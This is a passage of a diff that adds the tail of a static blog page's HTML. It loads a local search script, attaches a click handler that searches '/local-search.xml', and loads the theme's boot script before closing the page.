+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
